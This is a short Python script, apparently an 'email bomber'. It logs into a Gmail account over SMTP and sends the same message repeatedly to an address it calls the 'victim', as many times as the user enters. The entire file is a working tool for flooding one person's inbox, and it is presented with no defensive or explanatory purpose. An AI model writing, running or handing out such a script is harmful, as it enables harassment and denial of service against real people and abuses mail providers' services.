import os
import smtplib
import getpass
import sys
import time

# input your credentials
your_email = input('Type in your gmail address ')
password = getpass.getpass('Please enter your password: ')

# bomb info
victim = input('Enter the email address to be bombed ')
body = input('Enter email body ')
subject = input('Enter the subject of email ')
max = input('Number of times you wish to bomb: ')

try:
    # default port and server name
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.ehlo()
    server.starttls()
    # logging in with your credentials
    server.login(your_email,password)
    for i in range(0, int(max)):
        message = 'Subject: {}\n\n{}'.format(subject, body)
        server.sendmail(your_email,victim,message)
        time.sleep(1)
        print('Email {} sent'.format(i+1))
        sys.stdout.flush()

    server.quit()
    print('\n Emails sent')

# handle exception
except smtplib.SMTPAuthenticationError:
    print('Error occured in authentication')
    sys.exit()
